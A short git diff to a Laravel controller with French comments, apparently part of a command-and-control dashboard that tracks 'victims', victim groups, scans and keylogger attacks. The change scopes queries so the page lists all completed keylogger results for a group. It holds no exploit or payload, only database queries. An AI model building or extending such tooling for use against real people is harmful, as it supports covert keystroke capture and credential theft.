@@ -74,15 +74,19 @@ class NetworkController extends Controller
                             ->select('victims.*') // Sélectionner toutes les colonnes de la table victims
                             ->get();
 
-        $scan = VictimAttacks::where('type', 'scan')
-                            ->where('state', 'done')
-                            ->latest('created_at')
+        // Récupérer le dernier scan terminé pour les victimes de ce groupe
+        $scan = VictimAttacks::join('victim_groups', 'victim_attacks.victim_id', '=', 'victim_groups.victim_id')
+                            ->where('victim_groups.group_id', $id)
+                            ->where('victim_attacks.type', 'scan')
+                            ->where('victim_attacks.state', 'done')
+                            ->latest('victim_attacks.created_at')
                             ->first();
 
-        $keylogger = VictimAttacks::where('type', 'keylogger')
-                            ->where('state', 'done')
-                            ->latest('created_at')
-                            ->first();
+        $keyloggers = VictimAttacks::join('victim_groups', 'victim_attacks.victim_id', '=', 'victim_groups.victim_id')
+                            ->where('victim_groups.group_id', $id)
+                            ->where('victim_attacks.type', 'keylogger')
+                            ->where('victim_attacks.state', 'done')
+                            ->get();
 
     
         return view('network.show', [
@@ -91,7 +95,7 @@ class NetworkController extends Controller
             'name' => $name, 
             'victims' => $victims,
             'scan' => $scan,
-            'keylogger' => $keylogger
+            'keyloggers' => $keyloggers
         ]);
     }
 
